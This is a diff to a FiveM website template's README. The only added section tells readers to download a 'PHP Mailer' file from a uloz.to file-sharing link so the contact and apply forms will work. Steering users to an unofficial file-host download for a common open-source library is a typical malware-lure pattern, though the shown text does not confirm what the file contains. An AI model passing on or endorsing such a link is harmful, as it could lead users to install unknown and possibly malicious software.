@@ -4,6 +4,10 @@ FiveM Website
 # How to run?🏃
 The texts are inserted in the respective .html file. The individual links are inserted in the .html files as well as in the files contact.php and apply.php
 
+# PHP Mailer ⚡
+To run formulars, you need download this file!!
+Link : https://uloz.to/tam/ed6331b7-5487-40b5-81a6-e3150af4e0f7
+
 # Resolution 🖥️
 Website is avaible only on PC
 
